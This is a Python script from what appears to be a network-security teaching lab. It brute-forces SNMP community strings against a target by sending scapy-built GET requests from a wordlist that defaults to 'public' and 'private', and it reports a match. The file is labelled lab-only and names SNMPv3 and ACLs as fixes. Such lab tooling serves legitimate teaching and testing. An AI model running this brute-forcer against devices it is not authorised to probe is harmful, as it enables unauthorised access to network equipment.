# SPDX-License-Identifier: MIT
# Copyright (c) 2026 Chris <goabonga@pm.me>

"""Attack side of netlab-snmp: brute-force the community string. LAB ONLY.

Tries a wordlist of community strings with SNMP GET against a target; a match
lets the attacker walk the MIB. SNMPv3 and management ACLs (see agent.py) fix
this. Only ever target a device you own.
"""

from __future__ import annotations

import argparse

from netlab_core import verdict
from netlab_core.sniffing import load_scapy


def run(args: argparse.Namespace) -> int:
    s = load_scapy()
    words = args.community or ["public", "private"]
    print(f"[*] brute-forcing SNMP community on {args.target} ({len(words)} candidates)")
    for community in words:
        pkt = (
            s.IP(dst=args.target)
            / s.UDP(dport=161)
            / s.SNMP(
                community=community,
                PDU=s.SNMPget(varbindlist=[s.SNMPvarbind(oid=s.ASN1_OID("1.3.6.1.2.1.1.1.0"))]),
            )
        )
        ans = s.sr1(pkt, timeout=args.timeout, verbose=0)
        if ans is not None:
            verdict("ALERT", f"community '{community}' accepted")
            return 0
    verdict("INFO", "no community matched")
    return 0
